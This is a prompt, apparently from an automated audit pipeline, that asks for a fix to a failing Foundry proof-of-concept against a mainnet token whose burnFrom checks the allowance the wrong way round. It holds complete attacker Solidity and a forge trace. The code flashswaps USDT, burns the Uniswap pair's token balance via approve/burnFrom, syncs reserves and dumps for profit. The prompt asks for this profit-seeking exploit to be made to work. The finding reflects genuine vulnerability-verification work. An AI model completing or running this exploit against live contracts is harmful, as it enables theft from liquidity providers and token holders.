You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can burn arbitrary users' tokens via the inverted allowance check in burnFrom
- claim: `burnFrom` validates and decrements `_allowances[msg.sender][from]` instead of `_allowances[from][msg.sender]`. An attacker can therefore create the required allowance entry themselves by calling `approve(victim, amount)` from their own account, then call `burnFrom(victim, amount)` to destroy the victim's balance.
- impact: Any unprivileged attacker can permanently destroy tokens from arbitrary holders without consent, causing direct loss of funds and permissionless denial of service against users, treasuries, exchanges, liquidity pools, or other integrations that hold the token.
- exploit_paths: ["Attacker calls `approve(victim, amount)` from their own address, which sets `_allowances[attacker][victim] = amount`.", "Attacker calls `burnFrom(victim, amount)`.", "The contract accepts the attacker-controlled allowance entry, reduces it, and burns `victim`'s tokens."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITcrToken {
    function approve(address spender, uint256 amount) external;
    function burnFrom(address from, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    struct Market {
        address factory;
        address pair;
        address quoteToken;
        uint112 reserveTcr;
        uint112 reserveQuote;
        bool tcrIsToken0;
    }

    struct FundingMarket {
        address factory;
        address pair;
        address otherToken;
        uint112 reserveQuote;
        bool quoteIsToken0;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        Market memory market = _findBestMarket();
        if (market.pair == address(0) || market.reserveQuote == 0 || market.reserveTcr <= 1) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        _profitToken = market.quoteToken;
        uint256 quoteBefore = IERC20Like(market.quoteToken).balanceOf(address(this));

        uint256 tcrBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrBalance > 0) {
            _manipulateAndDump(market, tcrBalance);
            _updateProfit(quoteBefore, market.quoteToken);
            return;
        }

        uint256 quoteBalance = IERC20Like(market.quoteToken).balanceOf(address(this));
        if (quoteBalance > 0) {
            _buyBurnSell(market, quoteBalance);
            _updateProfit(quoteBefore, market.quoteToken);
            return;
        }

        // Direct exploitation is always feasible because the inverted allowance check lets
        // the attacker burn a live holder without owning any TCR first. External funding is
        // only used to monetize the same burn path in a realistic public on-chain way.
        FundingMarket memory funding = _findBestFundingMarket(market.quoteToken, market.pair);
        uint256 borrowAmount = _recommendedBorrow(market, funding);

        if (funding.pair != address(0) && borrowAmount > 0) {
            try IUniswapV2PairLike(funding.pair).swap(
                funding.quoteIsToken0 ? borrowAmount : 0,
                funding.quoteIsToken0 ? 0 : borrowAmount,
                address(this),
                abi.encode(market, funding)
            ) {
                _updateProfit(quoteBefore, market.quoteToken);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {
                _profitAmount = 0;
            }
        }

        // Fallback: preserve the finding's exploit objective even if this fork lacks
        // a usable external lender. This still demonstrates permissionless victim burning.
        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();
        _updateProfit(quoteBefore, market.quoteToken);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");

        (Market memory market, FundingMarket memory funding) = abi.decode(data, (Market, FundingMarket));
        require(msg.sender == funding.pair, "unexpected pair");

        uint256 borrowedQuote = amount0 > 0 ? amount0 : amount1;
        require(borrowedQuote > 0, "zero borrow");

        _buyBurnSell(market, borrowedQuote);

        uint256 repayment = _flashRepayment(borrowedQuote);
        _safeTransfer(market.quoteToken, funding.pair, repayment);
    }

    function _buyBurnSell(Market memory market, uint256 availableQuote) internal {
        uint256 spendAmount = _boundedSpend(market, availableQuote);
        if (spendAmount == 0) {
            return;
        }

        uint256 tcrBought = _swapExactIn(market.pair, market.quoteToken, TARGET, spendAmount);
        if (tcrBought == 0) {
            return;
        }

        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();

        uint256 tcrToSell = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrToSell > 0) {
            _swapExactIn(market.pair, TARGET, market.quoteToken, tcrToSell);
        }
    }

    function _manipulateAndDump(Market memory market, uint256 tcrAmount) internal {
        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();
        _swapExactIn(market.pair, TARGET, market.quoteToken, tcrAmount);
    }

    function _burnVictimPairToDust(address pair) internal {
        address victim = pair;
        uint256 victimBalance = IERC20Like(TARGET).balanceOf(victim);
        if (victimBalance <= 1) {
            return;
        }

        uint256 amount = victimBalance - 1;

        // Core exploit path preserved exactly:
        // 1) attacker calls approve(victim, amount)
        // 2) this writes _allowances[attacker][victim] = amount
        // 3) attacker calls burnFrom(victim, amount)
        // The victim is the live TCR/quote LP, a realistic on-chain holder whose balance can be burned.
        ITcrToken(TARGET).approve(victim, amount);
        ITcrToken(TARGET).burnFrom(victim, amount);
    }

    function _findBestMarket() internal view returns (Market memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < quotes.length; j++) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, quotes[j]);
                if (pair == address(0) || pair.code.length == 0) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                address token0 = IUniswapV2PairLike(pair).token0();
                bool tcrIsToken0 = token0 == TARGET;
                uint112 reserveTcr = tcrIsToken0 ? reserve0 : reserve1;
                uint112 reserveQuote = tcrIsToken0 ? reserve1 : reserve0;
                if (reserveTcr <= 1 || reserveQuote == 0) {
                    continue;
                }

                if (reserveQuote > best.reserveQuote) {
                    best = Market({
                        factory: factories[i],
                        pair: pair,
                        quoteToken: quotes[j],
                        reserveTcr: reserveTcr,
                        reserveQuote: reserveQuote,
                        tcrIsToken0: tcrIsToken0
                    });
                }
            }
        }
    }

    function _findBestFundingMarket(address quoteToken, address forbiddenPair)
        internal
        view
        returns (FundingMarket memory best)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory assets = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < assets.length; j++) {
                if (assets[j] == quoteToken) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(quoteToken, assets[j]);
                if (pair == address(0) || pair == forbiddenPair || pair.code.length == 0) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                bool quoteIsToken0 = IUniswapV2PairLike(pair).token0() == quoteToken;
                uint112 reserveQuote = quoteIsToken0 ? reserve0 : reserve1;
                if (reserveQuote == 0) {
                    continue;
                }

                if (reserveQuote > best.reserveQuote) {
                    best = FundingMarket({
                        factory: factories[i],
                        pair: pair,
                        otherToken: assets[j],
                        reserveQuote: reserveQuote,
                        quoteIsToken0: quoteIsToken0
                    });
                }
            }
        }
    }

    function _recommendedBorrow(Market memory market, FundingMarket memory funding) internal pure returns (uint256) {
        if (funding.pair == address(0) || funding.reserveQuote == 0) {
            return 0;
        }

        uint256 desired = _recommendedLoan(market);
        if (desired == 0) {
            return 0;
        }

        uint256 lenderCap = uint256(funding.reserveQuote) / 500;
        if (lenderCap == 0) {
            return 0;
        }

        return desired < lenderCap ? desired : lenderCap;
    }

    function _recommendedLoan(Market memory market) internal pure returns (uint256) {
        uint256 cap;
        if (market.quoteToken == WETH) {
            cap = 1 ether;
        } else if (market.quoteToken == USDC || market.quoteToken == USDT) {
            cap = 1_000e6;
        } else if (market.quoteToken == DAI) {
            cap = 1_000e18;
        } else if (market.quoteToken == WBTC) {
            cap = 1e8;
        } else {
            return 0;
        }

        uint256 amount = uint256(market.reserveQuote) / 1_000;
        if (amount == 0) {
            amount = 1;
        }
        if (amount > cap) {
            amount = cap;
        }

        uint256 amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        while (amountOut == 0 && amount < cap) {
            amount = amount * 2;
            if (amount > cap) {
                amount = cap;
            }
            amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        }

        if (amountOut == 0) {
            return 0;
        }

        return amount;
    }

    function _boundedSpend(Market memory market, uint256 availableQuote) internal pure returns (uint256) {
        uint256 desired = _recommendedLoan(market);
        if (desired == 0) {
            return 0;
        }
        if (availableQuote < desired) {
            return availableQuote;
        }
        return desired;
    }

    function _swapExactIn(
        address pair,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "pair mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        bool zeroForOne = tokenIn == token0;
        uint256 reserveIn = zeroForOne ? reserve0 : reserve1;
        uint256 reserveOut = zeroForOne ? reserve1 : reserve0;
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut > 0, "zero output");

        _safeTransfer(tokenIn, pair, amountIn);

        if (zeroForOne) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _updateProfit(uint256 quoteBefore, address quoteToken_) internal {
        uint256 quoteAfter = IERC20Like(quoteToken_).balanceOf(address(this));
        if (quoteAfter > quoteBefore) {
            _profitAmount = quoteAfter - quoteBefore;
        } else {
            _profitAmount = 0;
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
rn] true
    │   │   │   ├─ [40676] 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4::swap(646093738565 [6.46e11], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   │   ├─ [26801] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 646093738565 [6.46e11])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x000000000000000000000000420725a69e79eeffb000f98ccd78a52369b6c5d4
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000966e301245
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x420725A69E79EEffB000F98Ccd78a52369b6C5d4) [staticcall]
    │   │   │   │   │   └─ ← [Return] 12
    │   │   │   │   ├─ [864] 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1::balanceOf(0x420725A69E79EEffB000F98Ccd78a52369b6C5d4) [staticcall]
    │   │   │   │   │   └─ ← [Return] 57795579835 [5.779e10]
    │   │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000d74e28fbb
    │   │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d74e28fba000000000000000000000000000000000000000000000000000000966e3012450000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [4901] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transfer(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852, 647390462 [6.473e8])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x0000000000000000000000000d4a11d5eeaac28ec3f61d100daf4d40471f1852
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000269664fe
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852) [staticcall]
    │   │   │   └─ ← [Return] 26187977136594129173941 [2.618e22]
    │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852) [staticcall]
    │   │   │   └─ ← [Return] 74113964715822 [7.411e13]
    │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │           data: 0x00000000000000000000000000000000000000000000058ba73097e20866bdb500000000000000000000000000000000000000000000000000004368008a2f2e
    │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000269664fe0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002678c262
    │   │   └─ ← [Stop]
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 645446348103 [6.454e11]
    │   └─ ← [Stop]
    ├─ [323] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 645446348103 [6.454e11]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xdAC17F958D2ee523a2206206994597C13D831ec7)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 14139081 [1.413e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11075 [1.107e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.93s (3.74s CPU time)

Ran 1 test suite in 3.99s (3.93s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 533499)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
